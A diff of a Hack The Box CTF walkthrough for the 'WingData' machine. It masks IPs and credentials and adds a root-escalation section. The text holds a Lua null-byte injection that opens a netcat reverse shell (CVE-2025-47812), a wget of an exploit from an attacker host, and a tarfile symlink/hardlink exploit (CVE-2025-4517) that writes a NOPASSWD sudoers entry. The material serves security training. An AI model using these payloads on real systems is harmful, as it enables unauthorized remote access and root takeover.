@@ -1,12 +1,12 @@
 # HTB WingData — CTF Walkthrough & Theory Notes
 
-**Machine:** WingData | **Difficulty:** Easy | **OS:** Linux **CVE:** CVE-2025-47812 (Null Byte RCE) | **Goal:** Capture `user.txt`
+**Machine:** WingData | **Difficulty:** Easy | **OS:** Linux **CVE:** CVE-2025-47812 (Null Byte RCE) | **Goal:** Capture `user.txt` & `root.txt`
 
 ---
 
 ## A) Attack Overview
 
-> Full attack chain for the user flag:
+> Full attack chain for both flags:
 
 ```
 [Scan] nmap finds port 22 (SSH) and port 80 (HTTP)
@@ -23,6 +23,13 @@
         → SSH as local system user (wacky)
    ↓
 [USER FLAG] cat /home/wacky/user.txt
+   ↓
+[Escalate] sudo -l reveals restore_backup_clients.py runnable as root
+           → CVE-2025-4517 (Tarfile Symlink + Hardlink Bypass)
+           → Malicious tar archive adds wacky to sudoers
+           → sudo /bin/bash → root shell
+   ↓
+[ROOT FLAG] cat /root/root.txt
 ```
 
 ### Tools Reference
@@ -35,7 +42,8 @@
 |`ssh`|Stable authenticated shell access|
 |`hashcat`|Offline password hash cracking|
 |`python3`|Shell stabilization and local HTTP server|
-|`CVE-2025-47812.py`|PoC exploit script|
+|`CVE-2025-47812.py`|PoC exploit script — pre-auth RCE on Wing FTP|
+|`CVE-2025-4517-POC.py`|PoC exploit script — tarfile privilege escalation|
 
 ---
 
@@ -44,7 +52,7 @@
 ### B.1 — Host File Configuration
 
 ```bash
-echo "10.129.18.96  wingdata.htb ftp.wingdata.htb" >> /etc/hosts
+echo "10.129.XX.XX  wingdata.htb ftp.wingdata.htb" >> /etc/hosts
 ```
 
 Web servers often use virtual hosting — serving different content depending on the `Host:` HTTP header. Without mapping the hostname locally, tools will resolve to the wrong vhost or get a default page that hides the actual application.
@@ -56,7 +64,7 @@ Web servers often use virtual hosting — serving different content depending on
 **Fast initial scan:**
 
 ```bash
-nmap -Pn --min-rate 5000 10.129.18.96
+nmap -Pn --min-rate 5000 10.129.XX.XX
 ```
 
 ```
@@ -68,15 +76,15 @@ PORT   STATE SERVICE
 **Detailed service scan on discovered ports:**
 
 ```bash
-nmap -Pn -A -p 80,22 10.129.18.96
+nmap -Pn -A -p 80,22 10.129.XX.XX
 ```
 
 ```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
 | ssh-hostkey:
-|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
-|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
+|   256 XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX (ECDSA)
+|_  256 XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX (ED25519)
 80/tcp open  http    Apache httpd 2.4.66
 |_http-server-header: Apache/2.4.66 (Debian)
 |_http-title: WingData Solutions
@@ -138,7 +146,7 @@ Any Lua syntax injected into the username field gets written to this file and la
 ### Theory: The Null Byte Bypass Mechanism
 
 ```
-Input:    anonymous%00"]]..os.execute('nc 10.10.17.95 5555 -e /bin/sh')..[[
+Input:    anonymous%00"]]..os.execute('nc 10.10.XX.XX 5555 -e /bin/sh')..[[
                 │
                 ▼
 C Validator:  reads "anonymous" then stops at \0 → PASSES validation
@@ -165,15 +173,15 @@ nc -lvnp 5555
 ```bash
 git clone https://github.com/4m3rr0r/CVE-2025-47812-poc
 cd CVE-2025-47812-poc
-python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.17.95 5555 -e /bin/sh" -v
+python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.XX.XX 5555 -e /bin/sh" -v
 ```
 
 **Output:**
 
 ```
 [*] Testing target: http://ftp.wingdata.htb
-[+] Sending POST request with command: 'nc 10.10.17.95 5555 -e /bin/sh' and username: 'anonymous'
-[+] UID extracted: 8bb36760279649c98f3fa0a42c559668f528764d624db129b32c21fbca0cb8d6
+[+] Sending POST request with command: 'nc 10.10.XX.XX 5555 -e /bin/sh' and username: 'anonymous'
+[+] UID extracted: 8bb36760********************************************************************************
 [+] Sending GET request to /dir.html with UID: 8bb36760...
 [-] Error sending GET request: Read timed out.   ← normal, shell already fired
 ```
@@ -187,7 +195,7 @@ The timeout on the GET request is expected — the shell callback fires before t
 **Switch to your nc terminal:**
 
 ```
-connect to [10.10.17.95] from (UNKNOWN) [10.129.18.96] 37052
+connect to [10.10.XX.XX] from (UNKNOWN) [10.129.XX.XX] 37052
 whoami
 wingftp
 ```
@@ -224,7 +232,7 @@ cat wacky.xml
 
 ```xml
 <UserName>wacky</UserName>
-<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
+<Password>32940def********************************************************************************</Password>
 ```
 
 ---
@@ -234,25 +242,25 @@ cat wacky.xml
 Save the hash on your attack machine and crack it with hashcat. The hash is SHA-256 salted with the username (`WingFTP` as salt — mode 1410):
 
 ```bash
-echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > hash.txt
+echo "32940def********************************************************************************:WingFTP" > hash.txt
 hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 **Result:**
 
 ```
-32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
+32940def********************************************************************************:WingFTP:**************
 ```
 
-Password: `!#7Blushing^*Bride5`
+Password: `**************`
 
 ---
 
 ### D.4 — SSH In as wacky
 
 ```bash
-ssh wacky@10.129.18.96
-# Password: !#7Blushing^*Bride5
+ssh wacky@10.129.XX.XX
+# Password: **************
 ```
 
 ---
@@ -265,7 +273,162 @@ cat /home/wacky/user.txt
 
 ---
 
-## E) Key Concepts Reference
+## E) Phase 4 — Privilege Escalation to Root (CVE-2025-4517)
+
+### E.1 — Enumerate Sudo Privileges
+
+```bash
+sudo -l
+```
+
+**Output:**
+
+```
+Matching Defaults entries for wacky on wingdata:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin, use_pty
+
+User wacky may run the following commands on wingdata:
+    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
+```
+
+The user `wacky` can run `restore_backup_clients.py` as root with no password.
+
+---
+
+### E.2 — Inspect the Script
+
+```bash
+cat /opt/backup_clients/restore_backup_clients.py
+```
+
+Key observations from the script:
+
+- Accepts a `--restore-dir` argument (must start with `restore_`)
+- Validates a tag from the directory name (1–24 chars, alphanumeric/underscore only)
+- Extracts a tar archive using `tarfile.open(...).extractall(path=staging_dir, filter="data")`
+- Extraction runs with **root privileges**
+
+### Theory: CVE-2025-4517 — Tarfile Symlink + Hardlink Bypass
+
+Python's `tarfile` module with `filter="data"` offers partial protection against path traversal, but is still vulnerable to a chained **symlink + hardlink** attack:
+
+|Phase|Action|
+|---|---|
+|Build nested dirs|Create deep directory structure inside archive|
+|Symlink chain|Chain symlinks to traverse up to `/etc`|
+|Escape symlink|Final symlink points outside staging directory|
+|Hardlink to sudoers|Hardlink targets `/etc/sudoers`|
+|Write payload|Sudoers entry granting `wacky ALL=(ALL) NOPASSWD: ALL`|
+
+Because extraction runs as root, the malicious sudoers entry is written to `/etc/sudoers` during tar extraction.
+
+Reference: https://access.redhat.com/security/cve/cve-2025-4517
+
+---
+
+### E.3 — Transfer the PoC to the Target
+
+**On attack machine** — host the exploit file:
+
+```bash
+sudo python3 -m http.server 80
+```
+
+**On target machine** — download to `/tmp`:
+
+```bash
+cd /tmp
+wget http://10.10.XX.XX/CVE-2025-4517-POC.py
+ls -la
+```
+
+PoC source: https://github.com/AzureADTrent/CVE-2025-4517-POC
+
+---
+
+### E.4 — Run the Exploit
+
+```bash
+python3 CVE-2025-4517-POC.py
+```
+
+**Output:**
+
+```
+CVE-2025-4517 Tarfile Exploit
+Privilege Escalation via Symlink + Hardlink Bypass
+
+[*] Target user: wacky
+[*] Creating exploit tar for user: wacky
+[*] Phase 1: Building nested directory structure...
+[*] Phase 2: Creating symlink chain for path traversal...
+[*] Phase 3: Creating escape symlink to /etc...
+[*] Phase 4: Creating hardlink to /etc/sudoers...
+[*] Phase 5: Writing sudoers entry...
+[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
+[*] Deploying exploit to: /opt/backup_clients/backups/backup_9999.tar
+[+] Exploit deployed successfully
+[*] Triggering extraction via vulnerable script...
+[+] Backup: backup_9999.tar
+[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn_9999
+[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn_9999
+
+[+] Extraction completed
+[*] Verifying exploit success...
+[+] SUCCESS! User 'wacky' added to sudoers
+[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL
+
+============================================================
+[+] EXPLOITATION SUCCESSFUL!
+[+] User 'wacky' now has full sudo privileges
+[+] Get root with: sudo /bin/bash
+============================================================
+```
+
+---
+
+### E.5 — Spawn Root Shell
+
+When prompted, confirm spawning a root shell:
+
+```
+[?] Spawn root shell now? (y/n): y
+
+[*] Spawning root shell...
+[*] Run: sudo /bin/bash
+root@wingdata:/tmp#
+```
+
+---
+
+### E.6 — Verify Root & Capture Root Flag
+
+```bash
+id
+```
+
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+```bash
+cd ~
+ls
+```
+
+```
+root.txt
+```
+
+```bash
+cat root.txt
+```
+
+Root flag captured — CTF complete.
+
+---
+
+## F) Key Concepts Reference
 
 |Concept|Technical Explanation|
 |---|---|
@@ -275,24 +438,28 @@ cat /home/wacky/user.txt
 |Pre-Auth RCE|Vulnerability exploitable without valid credentials — maximum severity|
 |Hash Cracking|Offline dictionary attack — hashcat mode 1410 for SHA256+salt|
 |SSH Key Auth|Stable access after credential recovery|
+|Sudo Enumeration|`sudo -l` reveals commands runnable as root — critical privesc check|
+|CVE-2025-4517|Python tarfile symlink + hardlink bypass defeats `filter="data"` protection when run as root|
+|Tarfile Path Traversal|Malicious archives use symlink chains to write files outside the intended extraction directory|
+|Sudoers Injection|Writing `wacky ALL=(ALL) NOPASSWD: ALL` to `/etc/sudoers` grants full root access|
 
 ---
 
-## F) Quick Command Reference
+## G) Quick Command Reference
 
 ```bash
 # Environment setup
-echo "10.129.18.96 wingdata.htb ftp.wingdata.htb" >> /etc/hosts
+echo "10.129.XX.XX wingdata.htb ftp.wingdata.htb" >> /etc/hosts
 
 # Reconnaissance
-nmap -Pn --min-rate 5000 10.129.18.96
-nmap -Pn -A -p 80,22 10.129.18.96
+nmap -Pn --min-rate 5000 10.129.XX.XX
+nmap -Pn -A -p 80,22 10.129.XX.XX
 
-# Exploit
+# Exploit — CVE-2025-47812 (Wing FTP RCE)
 nc -lvnp 5555
 git clone https://github.com/4m3rr0r/CVE-2025-47812-poc
 cd CVE-2025-47812-poc
-python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.17.95 5555 -e /bin/sh" -v
+python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.XX.XX 5555 -e /bin/sh" -v
 
 # Shell stabilization
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -307,12 +474,25 @@ echo "HASH:WingFTP" > hash.txt
 hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
 
 # Stable access
-ssh wacky@10.129.18.96
+ssh wacky@10.129.XX.XX
 
 # User flag
 cat /home/wacky/user.txt
+
+# Privilege escalation — CVE-2025-4517
+sudo -l
+# On attack machine:
+sudo python3 -m http.server 80
+# On target:
+cd /tmp && wget http://<ATTACKER_IP>/CVE-2025-4517-POC.py
+python3 CVE-2025-4517-POC.py
+# Spawn root shell when prompted, or:
+sudo /bin/bash
+
+# Root flag
+cat /root/root.txt
 ```
 
 ---
 
-_HTB WingData | CVE-2025-47812 — Null Byte Injection → Lua RCE → Hash Cracking → User Flag_
+_HTB WingData | CVE-2025-47812 (Null Byte Injection → Lua RCE) + CVE-2025-4517 (Tarfile Privesc) → Root Flag_
